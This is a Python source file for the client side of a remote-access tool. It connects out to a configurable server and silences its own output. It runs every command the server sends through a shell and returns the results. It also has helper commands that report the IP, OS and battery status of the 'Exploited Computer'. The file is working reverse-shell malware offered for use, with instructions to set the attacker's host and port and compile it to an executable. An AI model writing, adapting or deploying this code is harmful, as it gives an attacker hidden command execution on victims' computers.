"""
Compiled to an exe if you are on windows, if you are linux you can set it up with python3 client.py.
This is the client side of the program, it will connect to the server and send the data to it.
The server can use the client to execute commands, tranfser files, and more.
"""

import socket
import subprocess
import time
import sys
import os
import psutil
from tabulate import tabulate

# EDIT HOST, PORT TO YOUR SERVER SETTINGS

HOST = "127.0.0.1"
PORT = 25565

# DONT EDIT BELOW

sys.stdout = open(os.devnull, "w")

while True:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    con = sock.connect((HOST, PORT))
    cmd = sock.recv(1024).decode().lower()

    output, err = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()

    valid_cmds = {'cmds': lambda: "\n"+tabulate([['get_ip', 'Grabs the exploited IP'], ['get_time', 'Grabs the Local Time for Exploited Computer'], ['get_date', 'Grabs the Local Date for Exploited Computer'], ['get_os', 'Grabs OS Name of Exploited Computer'], ['get_charging', 'Gets Charging status of Exploited Computer'], ['get_battery', 'Gets Battery % of Exploited Computer']], headers=['Name', 'Short Desc']),'get_ip': lambda: socket.gethostbyname(socket.gethostname()), 'get_time': lambda: time.strftime("%H:%M:%S", time.localtime()), 'get_date': lambda: time.strftime("%m/%d/%Y", time.localtime()), 'get_os': lambda: sys.platform, 'get_charging': lambda: str(psutil.sensors_battery().power_plugged), 'get_battery': lambda: str(psutil.sensors_battery().percent)}

    if cmd[:2] == 'cd':
        os.chdir(str(cmd[3:]))
        output = f'Path Changed to {str(cmd[3:])}'.encode()
    
    if cmd == "exit":
        sock.send("Exited".encode())
        sock.close()
        break

    if 'is not recognized' in str(err) and cmd not in valid_cmds:
        output = "Command not found".encode()
    if cmd in valid_cmds:
        output = valid_cmds[cmd]().encode()
    

    sock.send(output)
    sock.close()
    
